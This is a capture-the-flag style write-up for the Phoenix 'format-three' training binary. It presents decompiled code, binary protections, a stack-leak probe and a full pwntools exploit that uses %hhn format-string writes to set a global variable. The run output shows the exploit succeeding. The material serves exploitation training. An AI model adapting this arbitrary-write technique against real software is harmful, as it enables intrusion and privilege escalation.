# &#35; format-3

#### &#42; pseudocode using ghidra
```bash

void main(void)

{
  ssize_t sVar1;
  undefined local_1010 [4100];
  undefined *puStack12;
  
  puStack12 = &stack0x00000004;
  puts("Welcome to phoenix/format-three, brought to you by https://exploit.education");
  sVar1 = read(0,local_1010,0xfff);
  if (sVar1 < 1) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  bounce(local_1010);
  if (changeme == 0x64457845) {
    puts("Well done, the \'changeme\' variable has been changed correctly!");
  }
  else {
    printf("Better luck next time - got 0x%08x, wanted 0x64457845!\n",changeme);
  }
                    /* WARNING: Subroutine does not return */
  exit(0);
}


void bounce(char *param_1)

{
  printf(param_1);
  return;
}


```

#### &#42; check binary
```bash
$ file /opt/phoenix/i486/format-three
/opt/phoenix/i486/format-three: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
  dynamically linked, interpreter /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1, not stripped

$ checksec /opt/phoenix/i486/format-three
[*] '/opt/phoenix/i486/format-three'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/i486-linux-musl/lib'

```


#### &#42; how it work
```bash
$ /opt/phoenix/i486/format-three AAAA
Welcome to phoenix/format-three, brought to you by https://exploit.education
AAAA
AAAA
Better luck next time - got 0x00000000, wanted 0x64457845!


$ /opt/phoenix/i486/format-three
Welcome to phoenix/format-three, brought to you by https://exploit.education
AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
AAAA.0.0.0.f7f81cf7.f7ffb000.ffffd658.8048556.ffffc650.ffffc650.fff.0.41414141.2e78252e.252e7825.78252e78.2e78252e
Better luck next time - got 0x00000000, wanted 0x64457845!

```

#### &#42; vulnerable point
```bash
#### we need to overwrite changeme
$ objdump -t /opt/phoenix/i486/format-three | grep changeme
08049844 g     O .bss	00000004 changeme

```


#### &#42; payload
```bash

# changeme == 0x64457845
payload  = b""
payload += p32(0x08049844)
payload += p32(0x08049845)
payload += p32(0x08049846)
payload += p32(0x08049847)
payload += b".%x"*11
payload += b"A"*244    # 0x145
payload += b"%hhn"
payload += b"B"*51      # 0x178
payload += b"%hhn"
payload += b"B"*205      # 0x245
payload += b"%hhn"
payload += b"B"*31      # 0x264
payload += b"%hhn"

```

#### &#42; exploit
```bash
$ cat exp_format3.py
from pwn import *

context.arch='i386'
#context.log_level='debug'

filename="/opt/phoenix/i486/format-three"

# changeme == 0x64457845
payload  = b""
payload += p32(0x08049844)
payload += p32(0x08049845)
payload += p32(0x08049846)
payload += p32(0x08049847)
payload += b".%x"*11
payload += b"A"*244    # 0x145
payload += b"%hhn"
payload += b"B"*51      # 0x178
payload += b"%hhn"
payload += b"B"*205      # 0x245
payload += b"%hhn"
payload += b"B"*31      # 0x264
payload += b"%hhn"

print(len(p32(0x08049844) ))


conn = process(filename)
conn.sendline(payload)

conn.interactive()




$ python exp_format3.py
4
[+] Starting local process '/opt/phoenix/i486/format-three': pid 2448
[*] Switching to interactive mode
[*] Process '/opt/phoenix/i486/format-three' stopped with exit code 0 (pid 2448)
Welcome to phoenix/format-three, brought to you by https://exploit.education
D\x98\x0E\x98\x0F\x98\x0G\x98\x0.0.0.0.f7f81cf7.f7ffb000.ffffd668.8048556.ffffc660.ffffc660.fff.0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Well done, the 'changeme' variable has been changed correctly!
[*] Got EOF while reading in interactive
$

```


